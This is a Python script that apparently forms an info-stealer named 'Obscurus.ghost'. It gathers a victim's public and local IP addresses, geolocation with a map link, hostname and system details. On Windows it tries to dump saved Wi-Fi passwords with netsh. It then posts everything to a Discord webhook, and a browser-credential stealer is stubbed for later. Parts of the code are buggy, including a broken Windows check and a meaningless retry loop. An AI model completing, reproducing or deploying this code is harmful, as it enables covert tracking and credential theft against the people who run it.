import requests
import os
import datetime
import platform
import socket
import netifaces
import subprocess

from datetime import date

#FINISHED
#log ip 
raw_format = requests.get('https://api.duckduckgo.com/?q=ip&format=json')
grabbed_ip = raw_format.json()["Answer"].split()[4]

#FINISHED
#log location and other info
req = requests.get("https://ipinfo.io/json")
data = req.json()
ip = data.get('ip')
city = data.get('city')
country = data.get('country')
region = data.get('region')
org = data.get('org')
loc = data.get('loc')
googlemap = "https://www.google.com/maps/search/google+map++" + loc

#FINISHED, maybe add more stuff later
#general info
machine1 = platform.machine()
version1 = platform.version()
platform1 = platform.platform()
uname1 = platform.uname()
network_name = platform.node()
python = platform.python_build()
system1 = platform.system()
process1 = platform.processor()
computername = socket.gethostname()
localipaddress = socket.gethostbyname(computername)
date_of_extraction = date.today()

#extract browser creds
#finish later

#extracting wifi passwords
#FINISHED just debug
if os == ("nt"):
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]

#else:
#    pass

#FINISHED
#the discord part

url='WEBHOOK'

data_to_discord = {
}

#whole embed
data_to_discord["embeds"] = [
                {
                    'author': {
                        'name': f'Obscurus.ghost 1.1 \\ {date_of_extraction}'
                    },
                    'description': f' @everyone Instance of Obscurus.ghost was ran, extracted data:',
                    'fields': [
                        {
                            'name': 'PC informations ',
                            'value': f'''
                            Version - {version1}
                            Platform - {platform1}
                            Username - {uname1}
                            Process- {process1}
                            Machine - {machine1}
                            ComputerName - {computername}
                            ExitNode = {network_name}
                            Python = {python}
                            OS - {system1}
                            
                            '''
                        },
                        {
                            'name': 'Network informations ',
                            'value': f'''
                            IP - {grabbed_ip}
                            IP check - {ip}
                            Local - {localipaddress}
                            

                            '''
                        },
                        {
                            'name': 'Location ',
                            'value': f'''
                            City - {city}
                            Country - {country}
                            Region - {region}
                            Org- {org}
                            Location - {loc}
                            {googlemap}
                            ''',
                        },
                        {  #i need to add some sort of function to ignore wifi variable when on linux, but i am too dumb to do that :D
                            'name': "Credentials",
                            'value':f''' 
                             WIP

                            ''',
                        }
                    ],
                    'footer': {
                        'text': '- Obscurus.ghost 1.1 \\ burnt.chipset@obscurus.network'
                    }
            }
]
result = requests.post(url, json = data_to_discord)

request_for_retry = (requests.post(url, json = data_to_discord))
if result.status_code ==200:
    for x in request_for_retry:
        request_for_retry 
else:
    pass
